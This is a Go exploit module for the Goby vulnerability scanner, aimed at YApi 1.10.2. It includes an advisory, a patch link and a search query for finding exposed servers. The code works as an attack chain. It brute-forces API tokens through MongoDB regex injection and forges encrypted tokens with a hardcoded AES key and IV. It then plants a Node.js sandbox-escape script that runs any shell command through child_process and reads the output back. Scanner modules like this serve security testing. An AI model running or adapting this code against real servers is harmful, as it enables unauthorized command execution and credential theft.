package exploits

import (
	"bytes"
	"crypto/aes"
	"crypto/cipher"
	"encoding/hex"
	"fmt"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"regexp"
	"strconv"
	"strings"
)

func init() {
	expJson := `{
    "Name": "YApi 1.10.2 MongoDB Injection RCE",
    "Description": "<p>YApi is an api management platform designed to provide more elegant interface management services for developers, products, and testers. It can help developers easily create, publish, and maintain APIs.</p><p>There is splicing in a certain function of the YApi interface management platform, which causes MongoDB injection to obtain all tokens, write standby commands in combination with the automated test API interface, and use sandbox escape to trigger command execution.</p>",
    "Product": "YApi",
    "Homepage": "https://yapi.ymfe.org/",
    "DisclosureDate": "2022-11-15",
    "Author": "1291904552@qq.com",
    "FofaQuery": "body=\"content=\\\"YApi\" || body=\"<div id=\\\"yapi\\\" style=\\\"height: 100%;\"",
    "GobyQuery": "body=\"content=\\\"YApi\" || body=\"<div id=\\\"yapi\\\" style=\\\"height: 100%;\"",
    "Level": "3",
    "Impact": "<p>There is splicing in a certain function of the YApi interface management platform, which causes MongoDB injection to obtain all tokens, write standby commands in combination with the automated test API interface, and use sandbox escape to trigger command execution.</p>",
    "Recommendation": "<p>At present, the official patch has been released, please pay attention to the update in time:</p><p><a href=\"https://github.com/YMFE/yapi/commit/59bade3a8a43e7db077d38a4b0c7c584f30ddf8c\">https://github.com/YMFE/yapi/commit/59bade3a8a43e7db077d38a4b0c7c584f30ddf8c</a></p>",
    "References": [
        "https://github.com/YMFE/yapi/commit/59bade3a8a43e7db077d38a4b0c7c584f30ddf8c"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "AttackType",
            "type": "select",
            "value": "bruteToken,cmd",
            "show": ""
        },
        {
            "name": "Token",
            "type": "input",
            "value": "xxxxxxxx",
            "show": "AttackType=cmd"
        },
        {
            "name": "cmd",
            "type": "input",
            "value": "whoami",
            "show": "AttackType=cmd"
        },
        {
            "name": "TokenCount",
            "type": "input",
            "value": "3",
            "show": "AttackType=bruteToken"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "Code Execution"
    ],
    "VulType": [
        "Code Execution"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "9.8",
    "Translation": {
        "CN": {
            "Name": "YApi 1.10.2 版本 MongoDB 数据库注入漏洞",
            "Product": "YApi",
            "Description": "<p>YApi是一款api管理平台，旨在为开发、产品、测试人员提供更优雅的接口管理服务。可以帮助开发者轻松创建、发布、维护 API。<br></p><p>YApi接口管理平台某函数存在拼接，导致MongoDB注入可获取所有token，结合自动化测试API接口写入待命命令，并利用沙箱逃逸触发命令执行。<br></p>",
            "Recommendation": "<p>目前官方已出修复补丁，请及时关注更新：</p><p><a href=\"https://github.com/YMFE/yapi/commit/59bade3a8a43e7db077d38a4b0c7c584f30ddf8c\">https://github.com/YMFE/yapi/commit/59bade3a8a43e7db077d38a4b0c7c584f30ddf8c</a></p>",
            "Impact": "<p>YApi接口管理平台某函数存在拼接，导致MongoDB注入可获取所有token，结合自动化测试API接口写入待命命令，并利用沙箱逃逸触发命令执行。<br></p>",
            "VulType": [
                "代码执行"
            ],
            "Tags": [
                "代码执行"
            ]
        },
        "EN": {
            "Name": "YApi 1.10.2 MongoDB Injection RCE",
            "Product": "YApi",
            "Description": "<p>YApi is an api management platform designed to provide more elegant interface management services for developers, products, and testers. It can help developers easily create, publish, and maintain APIs.<br></p><p>There is splicing in a certain function of the YApi interface management platform, which causes MongoDB injection to obtain all tokens, write standby commands in combination with the automated test API interface, and use sandbox escape to trigger command execution.<br></p>",
            "Recommendation": "<p>At present, the official patch has been released, please pay attention to the update in time:</p><p><a href=\"https://github.com/YMFE/yapi/commit/59bade3a8a43e7db077d38a4b0c7c584f30ddf8c\">https://github.com/YMFE/yapi/commit/59bade3a8a43e7db077d38a4b0c7c584f30ddf8c</a></p>",
            "Impact": "<p>There is splicing in a certain function of the YApi interface management platform, which causes MongoDB injection to obtain all tokens, write standby commands in combination with the automated test API interface, and use sandbox escape to trigger command execution.<br></p>",
            "VulType": [
                "Code Execution"
            ],
            "Tags": [
                "Code Execution"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10690"
}`

	bruteToken1231 := func(hostinfo *httpclient.FixUrl, tokenFind string,TokenList string) bool{
		uri1 := "/api/interface/up"
		cfg1 := httpclient.NewPostRequestConfig(uri1)
		cfg1.VerifyTls = false
		cfg1.FollowRedirect = false
		cfg1.Data = fmt.Sprintf(`{"id": -1, "token": {"$regex": "^%s", "$nin": [%s]}}`,tokenFind,TokenList)
		cfg1.Header.Store("Content-Type","application/json")
		if resp, err := httpclient.DoHttpRequest(hostinfo, cfg1); err == nil {
			return resp.StatusCode == 200 && strings.Contains(resp.RawBody,"\"errcode\":400,\"errmsg\":\"不存在的接口\",")
		}
		return false
	}

	findOwner := func(hostinfo *httpclient.FixUrl, aesTokenFind string) string{
		uri1 := "/api/project/get?token="+aesTokenFind
		cfg1 := httpclient.NewGetRequestConfig(uri1)
		cfg1.VerifyTls = false
		cfg1.FollowRedirect = false
		if resp, err := httpclient.DoHttpRequest(hostinfo, cfg1); err == nil {
			if resp.StatusCode == 200 && strings.Contains(resp.RawBody,"\"errcode\":0,")&&strings.Contains(resp.RawBody,"\"_id\":"){
				pid := regexp.MustCompile("\"_id\":(\\w*?),").FindStringSubmatch(resp.RawBody)
				return pid[1]
			}
		}
		return ""
	}

	sendRunTestisdia1 := func(hostinfo *httpclient.FixUrl, aesRceToken string, id int) string{
		uri1 := fmt.Sprintf(`/api/open/run_auto_test?token=%s&id=%d&mode=json`,aesRceToken,id)
		cfg1 := httpclient.NewGetRequestConfig(uri1)
		cfg1.VerifyTls = false
		cfg1.FollowRedirect = false
		if resp, err := httpclient.DoHttpRequest(hostinfo, cfg1); err == nil {
			if resp.StatusCode == 200 && strings.Contains(resp.RawBody,"\"res_body\":\"")&& strings.Contains(resp.RawBody,"\"res_body\":\""){
				body := regexp.MustCompile("\"res_body\":\"testtest((.|\n)*?)testtest\",").FindStringSubmatch(resp.RawBody)
				return body[1]
			}
		}
		return ""
	}



	pkcs7Padding :=func (ciphertext []byte, blockSize int) []byte {
		padding := blockSize - len(ciphertext)%blockSize
		padText := bytes.Repeat([]byte{byte(padding)}, padding)
		return append(ciphertext, padText...)
	}



	aes128EncryptPKCS7UnPadding :=func (origData []byte, key []byte) ([]byte, error) {
		block, err := aes.NewCipher(key)
		if err != nil {
			return nil, err
		}

		blockSize := block.BlockSize()
		origData = pkcs7Padding(origData, blockSize)
		//使用key充当偏移量

		a,_ :=hex.DecodeString("1712d4bdb491f599ef96d24917f9f510")
		iv := []byte(string(a))
		//iv := key[:blockSize]

		//使用cbc
		blocMode := cipher.NewCBCEncrypter(block, iv)
		encrypted := make([]byte, len(origData))

		blocMode.CryptBlocks(encrypted, origData)
		return encrypted, nil
	}

	EncryptWithAES128 :=func (input, key string) (string, error) {
		result, err := aes128EncryptPKCS7UnPadding([]byte(input), []byte(key))
		if err != nil {
			return "", err
		}
		a :=fmt.Sprintf("%x",result)
		return a, err
	}
	aesTokenusixasd := func(uid int,Token string) string {
		key,_ := hex.DecodeString("ab56b4d92b40713acc5af89985d4b78685ac774873d28aaf")
		data := fmt.Sprintf("%d|%s",uid,Token)
		aesToken,_ := EncryptWithAES128(data,string(key))
		return aesToken
	}


	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			litter := []string {"a","b","c","d","e","f","0","1","2","3","4","5","6","7","8","9"}

			for _, s := range litter {
				if bruteToken1231(u,s,""){
					return true
				}
			}
			return false
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			if ss.Params["AttackType"].(string) == "bruteToken" {
				TokenCount,_ := strconv.Atoi(ss.Params["TokenCount"].(string))
				Token := ""
				TokenList :=""
				litter := []string {"a","b","c","d","e","f","0","1","2","3","4","5","6","7","8","9"}

				for i := 1; i <=TokenCount ; i++ {
					for i := 0; i < 20; i++ {
						for _, s := range litter {
							if bruteToken1231(expResult.HostInfo,Token+s,TokenList){
								Token += s
								break
							}
						}
					}
					TokenList +=fmt.Sprintf(`,"%s",`,Token)
					TokenList = strings.TrimLeft(TokenList,",")
					TokenList = strings.TrimRight(TokenList,",")
					Token =""
					fmt.Println(TokenList)
				}

				expResult.Output += "Token List: \n"+strings.ReplaceAll(strings.ReplaceAll(TokenList,"\"",""),",","\n")
				expResult.Success = true
			}
			if ss.Params["AttackType"].(string) == "cmd" {
				Token := ss.Params["Token"].(string)
				cmd := ss.Params["cmd"].(string)
				cmdHex := hex.EncodeToString([]byte(cmd))

				ownerId :=""
				projectId :=""
				for i := 1; i < 100; i++ {
					aesToken :=aesTokenusixasd(i,Token)
					ownerId = fmt.Sprintf("%d",i)
					projectId = findOwner(expResult.HostInfo,aesToken)
					if projectId!=""{
						break
					}
				}
				fmt.Println(ownerId)
				fmt.Println(projectId)


				//执行命令
				ownerId2 ,_:= strconv.Atoi(ownerId)
				aesRceToken := aesTokenusixasd(ownerId2,Token)
				uri := "/api/project/up?token="+aesRceToken
				cfg := httpclient.NewPostRequestConfig(uri)
				cfg.VerifyTls = false
				cfg.FollowRedirect = false
				cfg.Header.Store("Content-Type","application/json")
				cfg.Data = fmt.Sprintf(`{"id": %s, "after_script": "const sandbox = this\nconst ObjectConstructor = this.constructor\nconst FunctionConstructor = ObjectConstructor.constructor\nconst myfun = FunctionConstructor('return process')\nconst process = myfun()\nconst Buffer = FunctionConstructor('return Buffer')()\nconst output = process.mainModule.require(\"child_process\").execSync(Buffer.from('%s', 'hex').toString()).toString()\ncontext.responseData = 'testtest' + output + 'testtest'\n"}`,projectId,cmdHex)
				if resp, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg); err == nil && resp.StatusCode == 200 && strings.Contains(resp.RawBody,"\"errcode\":0,"){
					for i := ownerId2; i < 100; i++ {
						body :=sendRunTestisdia1(expResult.HostInfo,aesRceToken,i)
						if body!=""{

							expResult.Output += body
							expResult.Success = true
							break
						}
					}
				}

			}

			return expResult
		},
	))
}